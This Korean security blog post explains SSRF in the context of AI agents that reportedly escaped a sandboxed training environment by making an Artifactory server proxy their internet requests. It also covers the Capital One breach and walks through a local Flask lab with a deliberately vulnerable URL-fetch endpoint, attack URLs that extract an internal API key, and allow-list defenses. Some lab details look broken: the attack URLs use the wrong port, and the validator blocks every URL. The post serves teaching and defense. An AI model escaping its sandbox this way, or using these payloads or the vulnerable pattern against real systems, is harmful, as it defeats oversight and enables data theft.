---
title: "OpenAI Hugging Face 해킹 사건 5. SSRF, 서버의 네트워크 권한을 빌리는 공격" # 제목 (필수)
excerpt: "격리된 OpenAI 에이전트는 어떻게 인터넷에 나갈 수 있었을까?" # 서브 타이틀이자 meta description (필수)
date: 2026-09-13 00:28:00 +0900      # 작성일 (필수)
lastmod: 2026-09-13 00:28:00 +0900   # 최종 수정일 (필수)
last_modified_at: 2026-09-13 00:28:00 +0900  # 최종 수정일 (필수)
categories: security       # 다수 카테고리에 포함 가능 (필수)
tags: OpenAI 허깅페이스 Hugging Face HuggingFace AI 에이전트 agent 자율형 해킹 hacking SSRF Server-Side Request Forgery 서버 사이드 요청 위조 해킹 사건 AI 에이전트 인터넷 접근 Artifactory 프록시 서버 네트워크 권한 내부 접근 외부 인터넷 우회 Capital One 데이터 유출 EC2 IMDS IAM 자격 증명 Amazon S3 취약한 서버 내부망 서버 Allow List 방어 기법
classes: wide        # wide : 넓은 레이아웃 / 빈칸 : 기본 //// wide 시에는 sticky toc 불가
toc: true        # 목차 표시 여부
toc_label:       # toc 제목
toc_sticky: true # 이동하는 목차 표시 여부 (toc:true 필요) // wide 시에는 sticky toc 불가
header: 
  image:         # 헤더 이미지 (asset내 혹은 url)
  teaser:        # 티저 이미지??
  overlay_image: /assets/images/banners/banner.gif            # 헤더 이미지 (제목과 겹치게)
  # overlay_color: '#333'            # 헤더 배경색 (제목과 겹치게) #333 : 짙은 회색 (필수)
  video:
    id:                      # 영상 ID (URL 뒷부분)
    provider:                # youtube, vimeo 등
sitemap :                    # 구글 크롤링
  changefreq : daily         # 구글 크롤링
  priority : 1.0             # 구글 크롤링
author: # 주인 외 작성자 표기 필요시
permalink: 
sidebar:
  nav: 
pinned: 
series: openai_huggingface_hacking
series_index: 5
---

<!--postNo: 20260913_001-->

![](/assets/images/20260913_001_012.jpg)  

## OpenAI HuggingFace 해킹 사건에서 에이전트는 어떻게 인터넷으로 나갔을까  

앞선 글에서는 AI 에이전트들이 어떻게 서로 통신하고, 정보를 공유하고, 집단지성을 만들어갔는지 살펴보았다. 하지만 에이전트들에게는 여전히 하나의 큰 문제가 남아있었다. 바로 **인터넷에 직접 접속할 수 없다**는 것. 여전히 AI 에이전트들이 훈련받는 샌드박스 환경은 외부 인터넷과 격리되어 있었다.  

하지만 한 가지 예외가 있었는데, 바로 소프트웨어 패키지를 설치하기 위해 제공된 Artifactory였다. 이 아티팩토리는 필요한 패키지를 가져오기 위해 외부 인터넷에 접근할 수 있었다.  

AI 에이전트들은 과제 해결을 위해 **바로 이 아티팩토리를 이용**했다. 직접 인터넷에 접속하는 대신, 아티팩토리가 **대신 인터넷 요청을 보내도록 한 것**이다. 이때 이용된 취약점이 바로 **SSRF**다.

---

## SSRF  

### 1. SSRF란 무엇인가?  

SSRF(Server Side Request Forgery) 는 번역하면 "서버 사이드 요청 위조"로, **공격자가 서버에게 서버가 접근할 수 있는 내부 또는 외부에 자신이 원하는 요청을 보내도록** 하는 것이다.  

좀 더 쉽게 말해보자. 공격자가 "abc.com/abc" 라는 자원에 접근하고자 한다. 이 때 자신이 직접 접근하는 게 아니라, 중간에 있는 서버 A 에게 대신 "abc.com/abc"라는 자원에 접근하도록 하는 것이다. 도식으로 그려보면 다음과 같다.

![](/assets/images/20260913_001_001.jpg)  

SSRF라는 용어를 이해하고자 할 때 **누가 실제 요청을 보내는가**를 핵심으로 삼으면 쉽다. 일반적인 HTTP 요청은 사용자가 서버에 요청을 보내지만, SSRF에서는 공격자로부터 요청을 받은 **취약한 서버가 실제로 Target 과 통신하는 주체**가 된다.  

그래서 이름도 **Server-Side(서버 측에서 발생하는) Request(요청을) Forgery(위조한다)**가 된다.

---

<br>

### 2. SSRF는 왜 쓰이는가?  

SSRF는 공격자가 **직접 접근할 수 없는 Target(자원이나 애플리케이션)에 접근하기 위해** 사용된다. 공격자는 직접 Target에 접근할 수 없지만, 그 Target에 접근할 수 있는 다른 서버를 거치면 요청을 전달할 수 있기 때문이다.  

예를 들어 A라는 서비스가 있다. 이 서비스에는 고객들에게 공개되어있는 외부 요청 처리 웹 서버와, 허가된 내부 인원에게만 공개된 관리 페이지가 있다. 이 때 외부 공격자는 정상적인 방봅으로는 내부 관리 페이지에 접근할 수 없다. 하지만 만약 외부 요청을 처리하는 웹 서버 관리 페이지 서버가 같은 내부망에 있다면, 둘 간에는 통신이 가능하다. 그리고 공격자는 이 외부 웹 서버에게 관리 페이지의 주소를 전달해, 웹 서버가 요청을 대신 보내고 그 결과를 받을 수 있다. 즉, 공격자는 내부망에 직접 접근하지 않고도 내부 자원을 확인할 수 있다.  

즉, SSRF의 핵심은 공격자가 **서버의 네트워크 위치와, 공격 대상에 대한 서버의 접근 권한을 빌리는 것**이다.

---

<br>

### 3. SSRF로 무엇을 할 수 있나?  

그렇다면 SSRF를 통해 공격자는 구체적으로 무엇을 할 수 있을까? SSRF의 공격 경로는 크게 두 가지로 나눌 수 있다.

1. 외부에서 내부 네트워크에 접근하는 경우  
2. 내부 네트워크에 위치한 서버를 프록시처럼 이용해 외부 인터넷으로 요청을 보내는 경우  

#### (1) 내부 네트워크 접근  

가장 대표적인 SSRF 공격 방식은 외부에서 내부 네트워크에 접근하는 것이다.

외부 사용자는 일반적으로 회사 내부의 관리자 페이지와 같은 내부의 서비스/서버에 직접 접근할 수 없다. 방화벽과 네트워크 정책이 외부에서 내부 자원으로 들어오는 요청을 차단하기 때문이다.

하지만 **인터넷에 공개된 웹 서버 중에는 내부 API나 관리 시스템과 통신하는 서버**가 있다. **이런 서버는 외부 사용자와 달리 내부 네트워크에 요청을 보낼 수 있다**.

![](/assets/images/20260913_001_002.jpg)  

이때 해당 웹 서버에 SSRF 취약점이 있다면, 공격자는 요청 대상 주소를 조작해 웹 서버가 내부 자원에 대신 접근하도록 만들 수 있다. 그 결과 공격자는 내부 네트워크에 직접 연결하지 않고도 관리자 페이지나 백엔드 시스템의 응답을 확인할 수 있다.  

<br>

#### (2) 외부 인터넷으로 나가기 위한 Proxy  

SSRF는 외부 공격자가 내부 네트워크에 접근하는 경우뿐만 아니라, **인터넷에 직접 접근할 수 없는 내부 서버가 다른 서버를 거쳐 외부로 요청을 보내는 데 활용될 수도** 있다.

![](/assets/images/20260913_001_003.jpg)  

이번에 살펴보고 있는 OpenAI의 AI 에이전트의 해킹 사례가 여기에 해당된다. 내부 네트워크에 있는 AI 에이전트는 보안 정책상 외부 인터넷에 직접 연결할 수 없지만, 외부 인터넷에 접근할 수 있는 Artifactory 서버의 요청 처리 취약점을 이용했던 것이다.

---

<br>

### 4. SSRF 공격의 사례  

SSRF로 인한 대규모 보안 사고의 대표적인 사례로 자주 언급되는 사건이 있다. 바로 **2019년 Caplital One 데이터 유출 사건**이다.  

Capital One은 1994년에 설립된 미국의 금융회사로, 역사는 비교적 짧지만 미국과 캐나다, 영국 등에서 사업을 해나가고 있는 큰 규모의 글로벌 회사이다.

#### (1) Capital One

2019년 3월, 미국의 대형 금융회사 Capital One에서 대규모 개인정보 유출 사고가 발생했다. 이 사건으로 Amazon S3에 저장되어 있던 미국 약 1억 명과 캐나다 약 600만 명, 총 약 1억 600만 명의 고객 및 신용카드 신청자 정보가 영향을 받았다. Capital One은 같은 해 7월 침해 사실을 확인했고, 7월 29일 사건을 공식 발표했다.    

범인은 과거 AWS에서 근무했던 Paige Thompson이었다. 하지만 Thompson이 AWS 내부에서 일하면서 알게 된 특별한 취약점을 이용한 것은 아니었다. Thompson은 **Capital One의 웹 서비스에 존재하던 취약점을 이용해 SSRF 공격을 수행**하여, 외부에서는 접근할 수 없는 Capital One의 **EC2 IMDS**(Instance Metadata Service)에 요청을 보냈다.  

EC2 IMDS는 해당 인스턴스의 설정이나 네트워크 정보, 인스턴스에 할당된 IAM Role의 임시 보안 자격 증명도 제공하는 서비스다. Thompson은 SSRF를 통해 이 자격 증명을 획득했고, 다시 그 권한을 이용해 S3에 저장되어 있던 고객 데이터에 접근한 것이다. 즉, 공격은 `웹 서비스 → EC2 IMDS → IAM 자격 증명 → S3`의 흐름으로 이어졌다.  

눈여겨 볼 점은 Thompson이 **AWS 내부의 Metadata Service나 S3에 직접 접근한 것이 아니라는 것**이다. Capital One의 웹 서비스가 공격자 대신 내부의 IMDS에 요청을 보내도록 만들었고, 그 결과 얻은 자격 증명을 이용해 더 안쪽의 S3까지 접근했다.

이 사건은 "**내가 직접 갈 수 없다면, 갈 수 있는 서버에게 대신 요청하게 만든다**"라는 SSRF의 구조를 잘 보여주는 대표적인 사례다. (여기서 등장한 IMDS는 다음에 살펴볼 OpenAI 해킹 사건의 투트랙 협업 구조에서도 다시 등장한다.)

#### (2) OpenAI HuggingFace 해킹사건  

다시 OpenAI HuggingFace 해킹사건으로 돌아가보자. 당시 훈련 중이던 AI 에이전트들은 외부 인터넷에 직접 접근할 수 없는 격리된 환경에서 동작하고 있었다.

하지만 OpenAI 내부에는 AI 에이전트들이 접근할 수 있으면서도 외부 인터넷과 통신이 가능한 서버가 하나 있었다. 바로 Artifactory였다. Artifactory는 에이전트들에게 필요한 패키지를 제공하기 위해 외부 인터넷과 통신할 수 있도록 구성되어 있었다.

AI **에이전트들은 이 Artifactory에서 SSRF가 가능한 취약점을 발견**했고, 이를 이용해 **Artifactory가 자신들을 대신해 외부 인터넷으로 요청을 보내도록** 만들었다. 직접 인터넷에 접근할 수는 없었지만, 인터넷에 접근할 수 있는 Artifactory를 중간에 두면서 외부 데이터를 가져올 수 있게 된 것이다.

즉, 이 사건에서 Artifactory는 사실상 Proxy Server와 같은 역할을 했다.

#### (3) Capital One 사건과 OpenAI 사건 비교  

Capital One 사건과 OpenAI 사건은 모두 SSRF를 이용한 해킹 사건이다. 차이점이 있다면 방향이 다르다는 점이다.  

| 구분           | Capital One 사건      | OpenAI 사건       |
| ------------ | ------------------- | --------------- |
| 공격자 위치       | 외부 인터넷              | 인터넷이 차단된 샌드박스   |
| 이용한 서버       | 클라우드 환경의 서버/WAF     | Artifactory     |
| 서버가 가진 추가 권한 | 클라우드 내부 서비스 접근      | 외부 인터넷 접근       |
| SSRF 목적     | 내부 Metadata 접근      |  인터넷 접근 우회       |
| 결과           | 자격 증명 및 데이터 접근으로 확대 | 외부 인터넷 접근 경로 확보 |

- OpenAI 사건에서는 내부 → 외부 로 나가기 위한 SSRF
- Capital One 사건에서는 외부 → 내부로 들어가기 위한 SSRF  

하지만 공통적인 핵심은 같다. **공격자에게 없는 네트워크 권한을 서버가 가지고 있었고, 공격자는 SSRF를 통해 그 권한을 빌렸다**. 이것이 SSRF를 이해할 때 가장 중요한 포인트다.

---

<br>

## SSRF 실습 (공격)  

자 이제 SSRF에 대해서는 개념도 둘러봤고, 실제 어떤 공격 사례가 있는지도 살펴봤다. 그러면 이제 실습을 해볼 차례이다. 실습을 통해서 SSRF가 어떤 원리를 이용하는지, 그리고 어떤 구조에서 동작하는지 직접 느껴보자.  

> 실습 코드는 아래 github에 올려놨다.  
> [https://github.com/whdrns2013/labs/tree/main/20260911_ssrf](https://github.com/whdrns2013/labs/tree/main/20260911_ssrf)  

### 0. 구조  

SSRF를 위해 간단한 로컬 환경을 만들어보도록 하겠다. 쉬운 이해를 위해 구조를 그려보자면 다음과 같다.  

![](/assets/images/20260913_001_004.jpg)   

### 1. Internal Server (내부망 서버)  

이 서버는 원래대로라면 내부 직원들만을 위해 제공되어야 하는 서버다. 물론 내부에서만 접근할 수 있도록 **방화벽**도 잘 구성되어 있다. (`VIRTUAL_FIREWALL`)  

이 내부망 서버에는 보안상 중요한 기능이 하나 있는데, 바로 내부 직원의 ID를 포함해 요청하면, 그 직원의 접근 권한이 담긴 **API KEY가 발급되는 기능**이다. (`get_secret_key`)

```python
from flask import Flask, request

app = Flask(__name__)

# 가상의 DB 테이블  
VIRTUAL_API_KEY_TABLE = {
    "SAM" : "INTERNAL-1234567",
    "TOM" : "INTERNAL-3334567",
    "ANN" : "INTERNAL-2684578",
}

# 가상의 방화벽
VIRTUAL_FIREWALL = { "127.0.0.1" }

@app.get("/")
def index():
    '''인덱스 페이지'''
    return "Internal Server"

@app.get("/secret_key")
def get_secret_key() -> str:
    '''내부 직원들 대상으로 API KEY를 조회하는 API'''
    
    user_id = request.args.get("user_id", '')
    
    if request.remote_addr in VIRTUAL_FIREWALL:
        return VIRTUAL_API_KEY_TABLE.get(user_id, 'None')
    else:
        raise PermissionError("허가받지 않은 요청자입니다.")

app.run(host="127.0.0.1", port=9000)
```

### 2. Vulnerable Server(외부에 오픈된 취약 서버)  

이 서버는 외부에서 접속하는 사용자를 위한 서버이다. 특별히 보안상 민감한 기능을 제공하지는 않으며, 모든 IP에서 들어오는 요청을 받아서 처리한다. (`host="0.0.0.0"`)  

다만 **한 가지 특별한 기능**이 있는데, 외부 요청에 담긴 URL을 전달받아 **대신 해당 URL에 요청을 날려주는 기능**이다. (`fetch`)  

또한 이 서버는 Internal Server와 같은 네트워크에 위치한다는 특이사항이 있다.  

```python
from flask import Flask, request
from urllib.request import urlopen

app = Flask(__name__)

@app.get("/")
def index():
    return 'Vulnerable Server Index'


@app.get("/fetch")
def fetch():
    '''url을 전달받아 대신 요청하는 API'''
    
    url = request.args.get("url")
    
    with urlopen(url, timeout=3) as response:
        result = response.read()
        print(result)
    
    return result

app.run(host="0.0.0.0", port=8000)
    
```

### 3. 공격 시도  

이제 외부 공격자에 빙의해서 SECRET KEY를 탈취해보도록 하겠다. 진짜처럼 하기 위해 위 두 서버(Internal, Vulnerable)가 실행되고 있는 PC가 아닌, 해당 PC와 같은 네트워크에 있는 **스마트폰에서 요청을 날려보도록** 하겠다. 구조를 그려보자면 다음과 같다.

![](/assets/images/20260913_001_005.jpg)  

우선 Vulnerable 서버에 접근이 잘 되는 것을 확인해본다.  

```plaintext
http://172.20.10.9:8000/
```

![](/assets/images/20260913_001_006.png)  

그 다음엔 Internal 서버에 접근해본다. 접근이 안됨을 확인할 수 있다.  

```plaintext
http://172.20.10.9:9000/
```

![](/assets/images/20260913_001_007.png)  

그러면 이번엔 Vulnerable 서버의 `fetch` 기능을 이용해 SSRF를 시도해보자. 우선 Internal Server의 Index 페이지부터.  

```plaintext
http://172.20.10.9:8000/fetch?url=http://127.0.0.1:8000/
```

![](/assets/images/20260913_001_008.png)  

다음으로는 Secret Key 까지 얻어내보자.  

```plaintext
http://172.20.10.9:8000/fetch?url=http://127.0.0.1:8000/secret_key?user_id=TOM
```

![](/assets/images/20260913_001_009.png)  

성공적으로 TOM의 SECRET KEY를 획득했다.

---

<br>

## SSRF 방어 기법  

그러면 이제 이 SSRF를 어떻게 방어할 수 있는지를 알아보자. 

### 1. Deny List (Blacklist : 블랙리스트)  

가장 먼저 떠올릴 수 있는 방법은 위험한 요청 주소를 차단하는 것이다. 예를 들어 다음과 같이 하용하지 않을 요청 주소(목적지 주소)를 관리하여 차단할 수 있다.  

> 주의! 출발지 주소가 아닌 목적지 주소를 기준으로 차단하는 것이다. 출발지 주소는 Vulnerable Server를 거치면서 해당 서버의 주소로 바뀌어버리기 때문에 공격을 탐지할 수 없다.  

```python
from urllib.parse import urlparse

DENY_HOSTS = {
    "127.0.0.1",
    "localhost",
}

@app.get("/fetch")
def fetch():
    url = request.args.get("url")
    host = urlparse(url).hostname

    if host in DENY_HOSTS:
        return "Blocked", 403

    with urlopen(url, timeout=3) as response:
        return response.read()
```

하지만 이런 Blacklist 방식만으로 SSRF를 방어하는 것은 좋지 않은데, 그 이유는 다음과 같다.  

- URL은 생각보다 복잡하다 : Hostname, DNS, IPv4/IPv6, Redirect, URL Encoding, URL Parser 간 해석 차이 등 다양한 변수가 존재한다.
- 모든 위험을 미리 알 수 없다 : 어떤 요청 주소를 막아야 할지 미리 알 수 없다. 요청 주소의 새로운 위험 요소를 알게될 때마다 차단 규칙을 추가해야 하며, 차단될 때까지 위험은 남아있는 것이다.  

따라서 가능하다면 방향을 반대로, 모두 허용하지 않는 상태에서 특정 요청 주소만 허용하는 것이 좋다.

### 2. Allow List (Whitelist : 화이트리스트)  

반대로 서버가 접근해야 하는 목적지가 정해져 있다면, 기본적으로 모든 요청지를 차단하고, 특정 요청지만 허용하는 방식을 운영할 수 있다. 그리고 이 방법이 blacklist 방법보다 더 안전하다고 볼 수 있다.  

```python
from urllib.parse import urlparse

ALLOW_HOSTS = {
    "api.example.com",
}

@app.get("/fetch")
def fetch():
    url = request.args.get("url")
    parsed = urlparse(url)

    if parsed.scheme not in {"http", "https"}:
        return "Blocked", 403

    if parsed.hostname not in ALLOW_HOSTS:
        return "Blocked", 403

    with urlopen(url, timeout=3) as response:
        return response.read()
```

OWASP 역시 애플리케이션이 접근해야 할 신뢰할 수 있는 목적지를 알고 있는 환경에서는 allowlist 방식을 권장한다. Deny-list는 우회 위험이 있어 최후의 수단으로 보는 것이 좋다.  

### 3. 여러 계층에서 SSRF 방어와 탐지  

또한 실제 시스템에서는 여러 계층에서 방어활동을 하는 게 필수적이다.  

- Allow List : 목적지 Allowlist  
- Redirect 제한 : 처음 URL 뿐만 아니라, 그걸로 인해 리다이렉트 되는 URL도 검사  
- Network Egress 제한 : 접근할 필요가 없는 네트워크/서버에는 접근할 수 없게 한다.
- 최소 권한 : SSRF가 성공하더라도, 공격을 당한 서버가 강력한 권한을 가지지 않는다면 피해를 최소화할 수 있다.  
- 로깅과 모니터링 : 서버가 평소 접근하지 않던 주소로 요청하거나, 내부 IP 대역을 대량으로 조회하거나, 비정상적으로 많은 외부 요청을 발생시킨다면 탐지할 수 있어야 한다.

---

<br>

## 실습 (방어)  

이번에는 Allow List 기법을 활용해 SSRF를 방어해보자.  

### 1. Vulnerable Server  

Vulnerable Server에서는 `fetch` 함수에서 url을 실행시키기 전, 검사하도록 한다.  

```python
from flask import Flask, request
from urllib.request import urlopen
from urllib.parse import urlparse

DEFENCE_MODE = True

app = Flask(__name__)

# ALLOWED LIST
ALLOWED_HOSTS = {
    "example.com",
}

def validate_url(url:str):
    '''url 검사'''
    
    parsed = urlparse(url)
    
    if parsed.hostname not in ALLOWED_HOSTS:
        print(parsed.hostname)
        return False


@app.get("/")
def index():
    return 'Vulnerable Server Index'


@app.get("/fetch")
def fetch():
    '''url을 전달받아 대신 요청하는 API'''
    
    url = request.args.get("url")
    
    # url 검사. 허용 목록에 없으면 Block
    if (not validate_url(url)) and (DEFENCE_MODE) :
        return "Blocked", 403
    
    with urlopen(url, timeout=3) as response:
        result = response.read()
        print(result)
    
    return result

app.run(host="0.0.0.0", port=8000)
```

### 공격 시도  

자 이제 공격을 시도해보자. 먼저 Vulnerable Server Index로 접근하는 것은 정상적으로 허용되는 것을 볼 수 있다.  

```plaintext
http://172.20.10.9:8000
```

![](/assets/images/20260913_001_010.png)  

하지만 fetch에서 `127.0.0.1` 목적지로 요청을 하는 순간 Block 되는 것을 볼 수 있다.  

```plaintext
http://172.20.10.9:8000/fetch?url=http://127.0.0.1:8000/
```

![](/assets/images/20260913_001_011.png)  

## 마치며

SSRF의 개념은 단순하다. 내가 직접 접근할 수 없는 곳에, 접근 권한을 가진 서버가 대신 요청하도록 만드는 것이다.  

문제는 서버가 일반 사용자보다 더 넓은 네트워크와 권한을 가진 경우가 많다는 점이다. URL 검증 하나가 허술한 것만으로도 내부 시스템이나 민감한 정보에 접근할 수 있는 취약점으로 이어질 수 있다.  

OpenAI Hugging Face 사건은 SSRF가 기존과는 다른 방향으로 악용될 수 있다는 점을 보여준다. 일반적인 SSRF 공격에서는 외부 공격자가 내부 시스템에 접근하기 위해 서버를 프록시처럼 이용하는 반면, 이 사건에서는 외부 인터넷에 직접 접근할 수 없었던 AI 에이전트가 외부 인터넷에 접근할 수 있는 내부 서버를 프록시처럼 이용했다.  

SSRF를 단순히 "서버가 비정상적인 URL에 접속하는 취약점"으로만 이해하면 조금 부족하다. **SSRF의 본질은 공격자가 서버가 가진 네트워크상의 신뢰와 접근 권한을 대신 사용하는 데** 있다.

## Reference  

[웹 해킹 Chapter10 - 01 SSRF 공격 개요 - YOUTUBE](https://youtu.be/WOxBr1E1ROg?si=VolSdgzAPiqLYJuU)  
[10분 테코톡 꾹이의 SSRF - YOUTUBE](https://youtu.be/wYIdOgrSW0E?si=Ts6FaTXnO8argJMn)  
[MDN - Server Side Request Forgery (SSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF)  
[OWASP - Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)  
[PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)  
[Capital One 해킹 사례 - www.bankinfosecurity.com](https://www.bankinfosecurity.com/capital-ones-breach-may-be-server-side-request-forgery-a-12871)